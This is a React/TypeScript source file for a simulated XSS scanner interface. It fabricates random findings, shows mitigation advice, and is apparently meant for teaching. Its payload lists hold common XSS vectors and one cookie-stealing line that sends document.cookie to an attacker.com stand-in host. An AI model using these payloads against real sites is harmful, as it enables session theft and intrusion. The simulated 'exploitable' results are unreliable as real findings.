import React, { useState, useEffect } from 'react';
import { useTerminal } from '@/hooks/use-terminal';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Checkbox } from '@/components/ui/checkbox';
import { AlertCircle, Play, Bug, Shield, ExternalLink, Code, AlertTriangle } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { cn } from '@/lib/utils';

interface XssDetectorProps {
  onScanComplete?: (result: any) => void;
}

interface XssVulnerability {
  id: string;
  payload: string;
  context: string;
  severity: 'High' | 'Medium' | 'Low';
  description: string;
  mitigationStrategy: string;
  successful: boolean;
  response?: string;
}

interface XssScanResult {
  target: string;
  timestamp: Date;
  vulnerabilities: XssVulnerability[];
  parameters: string[];
  payloadsUsed: number;
  scanDuration: string;
  successful: boolean;
}

export default function XssDetector({ onScanComplete }: XssDetectorProps) {
  const [target, setTarget] = useState<string>('');
  const [parameters, setParameters] = useState<string>('');
  const [scanMode, setScanMode] = useState<string>('passive');
  const [includeDOM, setIncludeDOM] = useState<boolean>(true);
  const [includeReflected, setIncludeReflected] = useState<boolean>(true);
  const [includeStored, setIncludeStored] = useState<boolean>(false);
  const [customPayloads, setCustomPayloads] = useState<string>('');
  const [isScanning, setIsScanning] = useState<boolean>(false);
  const [scanResults, setScanResults] = useState<XssScanResult | null>(null);
  const [selectedVulnerability, setSelectedVulnerability] = useState<XssVulnerability | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  const { addSystemLine, addInfoLine, addErrorLine, addCommandLine, addLine } = useTerminal();
  const { toast } = useToast();
  
  // Common XSS payloads for testing
  const commonPayloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<a href=\"javascript:alert('XSS')\">Click me</a>",
    "\"><script>alert('XSS')</script>",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
    "<div onmouseover=\"alert('XSS')\">Hover me</div>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "'-alert('XSS')-'",
    "';alert('XSS')//",
    "\"\"><img src=x onerror=prompt('XSS')>",
    "<script>fetch('https://attacker.com?cookie='+document.cookie)</script>"
  ];
  
  // DOM-based XSS payloads
  const domPayloads = [
    "#<script>alert('XSS')</script>",
    "#<img src=x onerror=alert('XSS')>",
    "javascript:alert(document.domain)",
    "#javascript:alert(document.cookie)",
    "#<svg onload=alert(document.domain)>",
    "?q=<script>alert(1)</script>",
    "?search=<img src=x onerror=alert(1)>"
  ];
  
  // Reset and clean state when inputs change
  useEffect(() => {
    setError(null);
  }, [target, parameters, scanMode, includeDOM, includeReflected, includeStored, customPayloads]);
  
  // Parse parameters string into an array
  const parseParameters = (paramStr: string): string[] => {
    if (!paramStr.trim()) return [];
    return paramStr.split(',').map(p => p.trim()).filter(p => p);
  };
  
  // Start the XSS scan
  const startScan = async () => {
    if (!target) {
      setError('Target URL is required');
      addErrorLine('Target URL is required');
      return;
    }
    
    // Validate URL format
    try {
      new URL(target);
    } catch (e) {
      setError('Invalid URL format. Please include http:// or https://');
      addErrorLine('Invalid URL format. Please include http:// or https://');
      return;
    }
    
    setIsScanning(true);
    setScanResults(null);
    setSelectedVulnerability(null);
    setError(null);
    
    const parsedParams = parseParameters(parameters);
    if (parsedParams.length === 0) {
      addInfoLine("No specific parameters provided. Scanning common parameters and request paths.");
    }
    
    // Log scan start in terminal
    const commandArgs = [
      `--target ${target}`,
      `--mode ${scanMode}`,
      parsedParams.length > 0 ? `--params ${parsedParams.join(',')}` : '',
      includeDOM ? '--dom' : '',
      includeReflected ? '--reflected' : '',
      includeStored ? '--stored' : ''
    ].filter(Boolean).join(' ');
    
    addCommandLine(`xss-scan ${commandArgs}`);
    addInfoLine(`Starting XSS scan on ${target}`);
    addInfoLine(`Scan mode: ${scanMode.toUpperCase()}`);
    addLine(`Testing ${includeDOM ? 'DOM-based, ' : ''}${includeReflected ? 'Reflected, ' : ''}${includeStored ? 'Stored ' : ''}XSS vectors`, "info");
    
    // Simulate scan duration based on selected options
    const scanDuration = scanMode === 'aggressive' ? 8000 : scanMode === 'active' ? 5000 : 3000;
    
    // Simulate the scanning process
    try {
      // Phase 1: Analyze the target
      addLine("Phase 1: Analyzing target for potential injection points...", "system");
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Phase 2: Testing payloads
      addLine("Phase 2: Testing XSS payloads against identified points...", "system");
      
      // Add some realistic-looking scan progress updates
      const steps = Math.floor(scanDuration / 1000);
      for (let i = 1; i <= steps; i++) {
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        if (i === 1) {
          addLine("Testing DOM injection vectors...", "info");
        } else if (i === 2) {
          addLine("Testing reflected XSS in query parameters...", "info");
        } else if (i === 3) {
          addLine("Testing POST parameters for XSS vulnerabilities...", "info");
        } else if (i === 4) {
          addLine("Checking for context-specific escaping...", "info");
        } else if (i === 5) {
          addLine("Testing stored XSS vectors...", "info");
        } else if (i === 6) {
          addLine("Evaluating client-side validation bypasses...", "info");
        } else if (i === 7) {
          addLine("Analyzing responses for successful injections...", "info");
        }
      }
      
      addLine("Phase 3: Analyzing results and generating report...", "system");
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Generate simulated scan results
      const simulatedResults = generateSimulatedResults();
      setScanResults(simulatedResults);
      
      // Provide summary in terminal
      if (simulatedResults.vulnerabilities.length > 0) {
        const vulnCount = simulatedResults.vulnerabilities.length;
        const highCount = simulatedResults.vulnerabilities.filter(v => v.severity === 'High').length;
        
        addLine(`[ALERT] Found ${vulnCount} potential XSS vulnerabilities!`, "error");
        if (highCount > 0) {
          addLine(`Critical: ${highCount} high severity XSS vulnerabilities detected`, "error");
        }
        
        simulatedResults.vulnerabilities.forEach((vuln, idx) => {
          if (idx < 3) { // Only show first 3 in terminal to avoid clutter
            addLine(`${vuln.severity} severity XSS: ${vuln.payload}`, vuln.severity === 'High' ? "error" : "warning");
          }
        });
        
        if (simulatedResults.vulnerabilities.length > 3) {
          addLine(`... and ${simulatedResults.vulnerabilities.length - 3} more vulnerabilities.`, "info");
        }
      } else {
        addLine(`[SUCCESS] No XSS vulnerabilities detected`, "success");
      }
      
      // Show toast notification
      toast({
        title: simulatedResults.vulnerabilities.length > 0 ? "XSS Vulnerabilities Found" : "Scan Complete",
        description: simulatedResults.vulnerabilities.length > 0 
          ? `Found ${simulatedResults.vulnerabilities.length} potential XSS vulnerabilities` 
          : "No XSS vulnerabilities detected",
        variant: simulatedResults.vulnerabilities.length > 0 ? "destructive" : "default",
      });
      
      // Call completion callback if provided
      if (onScanComplete) {
        onScanComplete(simulatedResults);
      }
    } catch (err) {
      addErrorLine(`Error during scan: ${(err as Error).message}`);
      setError(`Scan failed: ${(err as Error).message}`);
    } finally {
      setIsScanning(false);
    }
  };
  
  // Generate simulated scan results for educational purposes
  const generateSimulatedResults = (): XssScanResult => {
    // Let's simulate finding between 0-5 vulnerabilities based on scan mode
    let vulnCount = 0;
    
    if (scanMode === 'passive') {
      vulnCount = Math.floor(Math.random() * 2); // 0-1 vulnerabilities
    } else if (scanMode === 'active') {
      vulnCount = Math.floor(Math.random() * 3) + 1; // 1-3 vulnerabilities
    } else if (scanMode === 'aggressive') {
      vulnCount = Math.floor(Math.random() * 3) + 2; // 2-4 vulnerabilities
    }
    
    // Create array of parsed parameters, or use default ones for simulation
    const parsedParams = parseParameters(parameters);
    const simulatedParams = parsedParams.length > 0 
      ? parsedParams 
      : ['q', 'search', 'id', 'query', 'input', 'text', 'page', 'param'];
    
    // Select random parameters for vulnerabilities
    const vulnerableParams = [];
    for (let i = 0; i < vulnCount; i++) {
      if (simulatedParams.length > 0) {
        const randomIndex = Math.floor(Math.random() * simulatedParams.length);
        vulnerableParams.push(simulatedParams[randomIndex]);
        // Remove to avoid duplicates (unless we're simulating multiple vulns in same param)
        if (Math.random() > 0.3) { // 70% chance to remove param for variety
          simulatedParams.splice(randomIndex, 1);
        }
      }
    }
    
    // Context types for different XSS vulnerabilities
    const contexts = ['HTML attribute', 'HTML tag', 'JavaScript variable', 'URL parameter', 'JSON value'];
    
    // Generate vulnerabilities
    const vulnerabilities: XssVulnerability[] = [];
    
    for (let i = 0; i < vulnCount; i++) {
      const payloadPool = includeDOM && i % 3 === 0 
        ? domPayloads 
        : (customPayloads.trim() 
            ? customPayloads.split('\n').filter(p => p.trim()) 
            : commonPayloads);
            
      const randomPayload = payloadPool[Math.floor(Math.random() * payloadPool.length)];
      const randomContext = contexts[Math.floor(Math.random() * contexts.length)];
      const paramName = vulnerableParams[i] || 'parameter';
      const isSuccessful = Math.random() > 0.3; // 70% chance of successful exploitation in simulation
      
      // Determine severity based on context and payload
      let severity: 'High' | 'Medium' | 'Low';
      if (randomPayload.includes('document.cookie') || randomPayload.includes('fetch')) {
        severity = 'High';
      } else if (randomPayload.includes('alert(') || randomPayload.includes('prompt(')) {
        severity = Math.random() > 0.5 ? 'High' : 'Medium';
      } else {
        severity = 'Low';
      }
      
      const vuln: XssVulnerability = {
        id: `XSS-${i + 1}`,
        payload: randomPayload,
        context: randomContext,
        severity,
        description: getVulnerabilityDescription(randomContext),
        mitigationStrategy: getMitigationStrategy(randomContext),
        successful: isSuccessful,
        response: isSuccessful 
          ? `HTTP 200 OK - Response contains injected payload: ${randomPayload.substring(0, 30)}...` 
          : undefined
      };
      
      vulnerabilities.push(vuln);
    }
    
    // Sort by severity
    vulnerabilities.sort((a, b) => {
      const severityOrder = { 'High': 0, 'Medium': 1, 'Low': 2 };
      return severityOrder[a.severity] - severityOrder[b.severity];
    });
    
    // Generate duration string - more payloads = longer duration
    const minutes = Math.floor(Math.random() * 2);
    const seconds = Math.floor(Math.random() * 50) + 10;
    const scanDuration = minutes > 0 ? `${minutes}m ${seconds}s` : `${seconds}s`;
    
    return {
      target,
      timestamp: new Date(),
      vulnerabilities,
      parameters: simulatedParams,
      payloadsUsed: scanMode === 'passive' ? 5 : scanMode === 'active' ? 10 : 20,
      scanDuration,
      successful: true
    };
  };
  
  // Helper to get vulnerability description based on context
  const getVulnerabilityDescription = (context: string): string => {
    switch (context) {
      case 'HTML attribute':
        return 'XSS vulnerability exists where user input is directly placed into HTML attributes without proper encoding.';
      case 'HTML tag':
        return 'XSS vulnerability exists where user input can break out of the intended HTML context and create new HTML elements.';
      case 'JavaScript variable':
        return 'XSS vulnerability exists where user input is inserted into JavaScript code without proper sanitization.';
      case 'URL parameter':
        return 'XSS vulnerability exists where URL parameters are reflected in the page without proper encoding.';
      case 'JSON value':
        return 'XSS vulnerability exists where user input is inserted into JSON responses that are later parsed by the client.';
      default:
        return 'Cross-Site Scripting vulnerability detected where user input is not properly sanitized.';
    }
  };
  
  // Helper to get mitigation strategy based on context
  const getMitigationStrategy = (context: string): string => {
    switch (context) {
      case 'HTML attribute':
        return 'Use context-specific output encoding when placing user data into HTML attributes. Consider using attribute escaping libraries.';
      case 'HTML tag':
        return 'Use strict HTML encoding and consider Content Security Policy (CSP) headers to prevent script execution.';
      case 'JavaScript variable':
        return 'Properly validate and sanitize input, use JSON.stringify() for user data in JS, and implement a strong Content Security Policy.';
      case 'URL parameter':
        return 'URL-encode parameters and implement proper output encoding when reflecting values back to users.';
      case 'JSON value':
        return 'Ensure proper JSON serialization and use the Content-Type: application/json header with character set.';
      default:
        return 'Implement context-aware output encoding, validate input strictly, and consider using a Content Security Policy.';
    }
  };
  
  const getSeverityColor = (severity: string): string => {
    switch (severity) {
      case 'High':
        return 'text-red-500';
      case 'Medium':
        return 'text-orange-500';
      case 'Low':
        return 'text-yellow-500';
      default:
        return 'text-muted-foreground';
    }
  };
  
  const getSeverityIcon = (severity: string) => {
    switch (severity) {
      case 'High':
        return <AlertCircle className="h-4 w-4 text-red-500" />;
      case 'Medium':
        return <AlertTriangle className="h-4 w-4 text-orange-500" />;
      case 'Low':
        return <Bug className="h-4 w-4 text-yellow-500" />;
      default:
        return <Bug className="h-4 w-4" />;
    }
  };
  
  return (
    <div className="space-y-6">
      <Card className="p-4 border-primary/30 bg-card">
        <h2 className="text-xl font-tech text-primary mb-4">XSS Vulnerability Scanner</h2>
        
        <div className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="target-url" className="text-sm font-tech">
              Target URL
            </Label>
            <Input
              id="target-url"
              placeholder="https://example.com"
              value={target}
              onChange={(e) => setTarget(e.target.value)}
              className="font-mono"
              disabled={isScanning}
            />
            <p className="text-xs font-mono text-muted-foreground mt-1">
              Enter the full URL of the page to test, including http:// or https://
            </p>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label htmlFor="parameters" className="text-sm font-tech">
                Parameters to Test (Optional)
              </Label>
              <Input
                id="parameters"
                placeholder="param1, param2, param3"
                value={parameters}
                onChange={(e) => setParameters(e.target.value)}
                className="font-mono"
                disabled={isScanning}
              />
              <p className="text-xs font-mono text-muted-foreground mt-1">
                Comma-separated list of parameters to test. If empty, common parameters will be tested.
              </p>
            </div>
            
            <div className="space-y-2">
              <Label htmlFor="scan-mode" className="text-sm font-tech">
                Scan Mode
              </Label>
              <Select 
                defaultValue={scanMode} 
                onValueChange={setScanMode}
                disabled={isScanning}
              >
                <SelectTrigger id="scan-mode" className="font-mono">
                  <SelectValue placeholder="Select mode" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="passive">Passive (Basic checks)</SelectItem>
                  <SelectItem value="active">Active (Standard checks)</SelectItem>
                  <SelectItem value="aggressive">Aggressive (Comprehensive)</SelectItem>
                </SelectContent>
              </Select>
              <p className="text-xs font-mono text-muted-foreground mt-1">
                More aggressive scans test more payloads but take longer.
              </p>
            </div>
          </div>
          
          <div className="border border-border rounded-md p-3">
            <h3 className="text-sm font-tech mb-2">XSS Vector Types</h3>
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div className="flex items-center space-x-2">
                <Checkbox 
                  id="include-dom" 
                  checked={includeDOM}
                  onCheckedChange={(checked) => setIncludeDOM(!!checked)}
                  disabled={isScanning}
                />
                <Label 
                  htmlFor="include-dom" 
                  className="text-sm font-tech cursor-pointer"
                >
                  DOM-based XSS
                </Label>
              </div>
              
              <div className="flex items-center space-x-2">
                <Checkbox 
                  id="include-reflected" 
                  checked={includeReflected}
                  onCheckedChange={(checked) => setIncludeReflected(!!checked)}
                  disabled={isScanning}
                />
                <Label 
                  htmlFor="include-reflected" 
                  className="text-sm font-tech cursor-pointer"
                >
                  Reflected XSS
                </Label>
              </div>
              
              <div className="flex items-center space-x-2">
                <Checkbox 
                  id="include-stored" 
                  checked={includeStored}
                  onCheckedChange={(checked) => setIncludeStored(!!checked)}
                  disabled={isScanning}
                />
                <Label 
                  htmlFor="include-stored" 
                  className="text-sm font-tech cursor-pointer"
                >
                  Stored XSS
                </Label>
              </div>
            </div>
          </div>
          
          <div className="space-y-2">
            <Label htmlFor="custom-payloads" className="text-sm font-tech">
              Custom XSS Payloads (Optional)
            </Label>
            <Textarea
              id="custom-payloads"
              placeholder={"<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>"}
              value={customPayloads}
              onChange={(e) => setCustomPayloads(e.target.value)}
              className="font-mono h-20"
              disabled={isScanning}
            />
            <p className="text-xs font-mono text-muted-foreground mt-1">
              Enter one payload per line. If empty, common XSS payloads will be used.
            </p>
          </div>
          
          {error && (
            <div className="bg-destructive/10 p-3 rounded-md border border-destructive/50 text-destructive flex items-start gap-2 text-sm font-mono">
              <AlertCircle className="h-4 w-4 mt-0.5" />
              <span>{error}</span>
            </div>
          )}
          
          <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-3">
            <Button
              onClick={startScan}
              disabled={isScanning}
              className="bg-primary text-primary-foreground hover:bg-primary/90 font-tech"
            >
              {isScanning ? (
                <span className="flex items-center">
                  <span className="animate-pulse">Scanning...</span>
                </span>
              ) : (
                <span className="flex items-center">
                  <Play className="h-4 w-4 mr-2" />
                  Start XSS Scan
                </span>
              )}
            </Button>
          </div>
          
          {isScanning && (
            <div className="bg-background/50 p-3 rounded-md border border-border">
              <p className="text-sm font-tech text-primary mb-2 animate-pulse">Scan in progress...</p>
              <p className="text-xs font-mono text-muted-foreground">
                Testing for XSS vulnerabilities. This might take a few moments.
              </p>
            </div>
          )}
        </div>
      </Card>
      
      {scanResults && (
        <Card className="p-4 border-secondary/30 bg-card">
          <h2 className="text-lg font-tech text-secondary mb-4 flex items-center">
            Scan Results
            <span className="ml-2 text-xs font-mono text-muted-foreground">
              ({scanResults.scanDuration})
            </span>
          </h2>
          
          <div className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
              <div className="bg-background p-3 rounded-md border border-border">
                <div className="text-xs font-mono text-muted-foreground">Target</div>
                <div className="font-mono text-sm mt-1 break-all">{scanResults.target}</div>
              </div>
              
              <div className="bg-background p-3 rounded-md border border-border">
                <div className="text-xs font-mono text-muted-foreground">Payloads Tested</div>
                <div className="font-mono text-sm mt-1">{scanResults.payloadsUsed}</div>
              </div>
              
              <div className="bg-background p-3 rounded-md border border-border">
                <div className="text-xs font-mono text-muted-foreground">Vulnerabilities</div>
                <div className="font-mono text-sm mt-1 flex items-center">
                  <span className={scanResults.vulnerabilities.length > 0 ? 'text-red-500' : 'text-green-500'}>
                    {scanResults.vulnerabilities.length}
                  </span>
                  {scanResults.vulnerabilities.length === 0 && (
                    <Shield className="h-4 w-4 ml-2 text-green-500" />
                  )}
                </div>
              </div>
            </div>
            
            <Tabs defaultValue="vulnerabilities" className="w-full">
              <TabsList className="grid grid-cols-2 mb-2">
                <TabsTrigger value="vulnerabilities" className="text-xs font-mono">
                  Vulnerabilities ({scanResults.vulnerabilities.length})
                </TabsTrigger>
                <TabsTrigger value="details" className="text-xs font-mono" disabled={!selectedVulnerability}>
                  Vulnerability Details
                </TabsTrigger>
              </TabsList>
              
              <TabsContent value="vulnerabilities">
                {scanResults.vulnerabilities.length === 0 ? (
                  <div className="bg-green-500/10 border border-green-500/20 rounded-md p-4 text-center">
                    <Shield className="h-6 w-6 text-green-500 mx-auto mb-2" />
                    <p className="text-sm font-tech text-green-500">No XSS vulnerabilities detected</p>
                    <p className="text-xs font-mono text-muted-foreground mt-2">
                      The scan did not detect any Cross-Site Scripting vulnerabilities. However, always follow security best practices
                      and continue regular security testing as web applications evolve.
                    </p>
                  </div>
                ) : (
                  <div className="border border-border rounded-md">
                    <div className="bg-muted p-2 grid grid-cols-12 gap-2 font-tech text-xs border-b border-border">
                      <div className="col-span-1">Severity</div>
                      <div className="col-span-5">Payload</div>
                      <div className="col-span-3">Context</div>
                      <div className="col-span-3">Status</div>
                    </div>
                    
                    <div className="max-h-64 overflow-y-auto">
                      {scanResults.vulnerabilities.map((vuln, index) => (
                        <div 
                          key={index}
                          className={cn(
                            "p-2 grid grid-cols-12 gap-2 font-mono text-xs cursor-pointer hover:bg-primary/5",
                            index % 2 === 0 ? "bg-background" : "bg-muted",
                            selectedVulnerability?.id === vuln.id ? "bg-primary/10 border-l-2 border-l-primary" : ""
                          )}
                          onClick={() => setSelectedVulnerability(vuln)}
                        >
                          <div className={cn("col-span-1 flex items-center", getSeverityColor(vuln.severity))}>
                            {getSeverityIcon(vuln.severity)}
                          </div>
                          <div className="col-span-5 truncate font-code">
                            {vuln.payload}
                          </div>
                          <div className="col-span-3">
                            {vuln.context}
                          </div>
                          <div className="col-span-3">
                            <span className={vuln.successful ? 'text-red-500' : 'text-muted-foreground'}>
                              {vuln.successful ? 'Exploitable' : 'Potential'}
                            </span>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </TabsContent>
              
              <TabsContent value="details">
                {selectedVulnerability && (
                  <div className="border border-border rounded-md p-4 space-y-4">
                    <div className="flex items-start justify-between">
                      <div className="space-y-1">
                        <h3 className="text-lg font-tech flex items-center gap-2">
                          {getSeverityIcon(selectedVulnerability.severity)}
                          <span className={getSeverityColor(selectedVulnerability.severity)}>
                            {selectedVulnerability.severity} Risk XSS Vulnerability
                          </span>
                        </h3>
                        <div className="text-xs font-mono text-muted-foreground">
                          {selectedVulnerability.id} | {selectedVulnerability.context}
                        </div>
                      </div>
                    </div>
                    
                    <div className="space-y-3 text-sm font-mono">
                      <div>
                        <h4 className="text-xs text-muted-foreground mb-1">Payload</h4>
                        <div className="p-2 bg-background rounded-sm font-code break-all text-primary">
                          {selectedVulnerability.payload}
                        </div>
                      </div>
                      
                      {selectedVulnerability.response && (
                        <div>
                          <h4 className="text-xs text-muted-foreground mb-1">Server Response</h4>
                          <div className="p-2 bg-background rounded-sm overflow-x-auto">
                            {selectedVulnerability.response}
                          </div>
                        </div>
                      )}
                      
                      <div>
                        <h4 className="text-xs text-muted-foreground mb-1">Description</h4>
                        <p className="p-2 bg-background rounded-sm text-xs">
                          {selectedVulnerability.description}
                        </p>
                      </div>
                      
                      <div>
                        <h4 className="text-xs text-muted-foreground mb-1">Mitigation Strategy</h4>
                        <p className="p-2 bg-background rounded-sm text-xs">
                          {selectedVulnerability.mitigationStrategy}
                        </p>
                      </div>
                      
                      <div className="p-2 bg-secondary/10 rounded-sm">
                        <h4 className="text-xs font-tech text-secondary mb-1">Security Note</h4>
                        <p className="text-xs">
                          Cross-Site Scripting (XSS) allows attackers to inject client-side scripts into web pages viewed by other users.
                          This can be used to steal cookies, session tokens, or other sensitive information kept in the browser.
                        </p>
                      </div>
                    </div>
                  </div>
                )}
              </TabsContent>
            </Tabs>
            
            <div className="flex items-center text-xs text-muted-foreground mt-2">
              <Shield className="h-3 w-3 mr-1" />
              <span>
                This is a simulated result for educational purposes. 
                In a real XSS scanner integration, this would show actual scan findings.
              </span>
            </div>
          </div>
        </Card>
      )}
    </div>
  );
}